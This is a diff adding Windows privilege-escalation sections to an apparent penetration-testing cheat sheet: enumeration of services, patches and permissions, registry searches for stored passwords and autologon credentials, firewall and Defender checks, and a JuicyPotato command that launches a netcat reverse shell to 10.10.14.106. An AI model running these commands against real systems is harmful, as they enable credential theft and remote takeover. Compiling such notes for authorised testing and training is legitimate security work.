@@ -332,6 +332,8 @@ ssh -D 1080 -q -C -N user@TARGETIP
 ## Privesc (Privilege Escalation)
 
 [linpeas & winpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20260121-aabd17ef)
+[Windows-exploit-suggester](https://github.com/Pwnistry/Windows-Exploit-Suggester-python3)
+for this one, you need to paste the output of target's systeminfo on a txt and provide it to the tool
 
 ### Linux notes
 
@@ -360,6 +362,46 @@ find / -perm -u=s -type f 2>/dev/null
 systeminfo
 ```
 
+##### Installed Updates
+```shell
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+
+```shell
+Wmic logicaldisk get caption,description 
+```
+
+#### Services
+```shell
+sc query state=all | findstr "SERVICE_NAME:"
+```
+
+```shell
+wmic service get name,displayname,pathname,startmode
+```
+
+```shell
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+```
+
+#### Applications
+
+```shell
+wmic product get name, version, vendor
+```
+
+```shell
+accesschk.exe -uws "Everyone" "C:\Program Files"
+```
+
+```shell
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+#### File permissions
+```shell
+icacls Directory_or_file
+```
 
 #### Stored credentials (cached)
 
@@ -367,11 +409,29 @@ systeminfo
 cmdkey /list
 ```
 
+#### Credentials from windows registry
+autologon creds
+```shell
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+```
+search for password in registry hives
+```shell
+reg query HKLM /f password /t REG_SZ /s
+```
+
+
 #### Finding string inside files
 This searches only on working directory and its subdirectories, here i search the string "password" on multiple file extensions
 ```shell
 findstr /si password *.xml *.ini *.txt *.config 2>nul
 ```
+
+#### SeImpersonate 
+via juicypotato and netcat (exe)
+```shell
+./JuicyPotato.exe -l 3333 -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.106 3333" -t *
+```
+or via [printspoofer](https://github.com/itm4n/PrintSpoofer)
 
 ## Cracking
 
@@ -468,6 +528,20 @@ shell
 
 
 # AD attacks
+
+## Firewalls - AV - Defender
+```shell
+netsh firewall show state  
+```
+```shell
+netsh firewall show config  
+```
+```shell
+Sc query windefend
+```
+```shell
+Netsh advfirewall firewall dump, netsh firewall show state 
+```
 
 ## NTLM relay
 
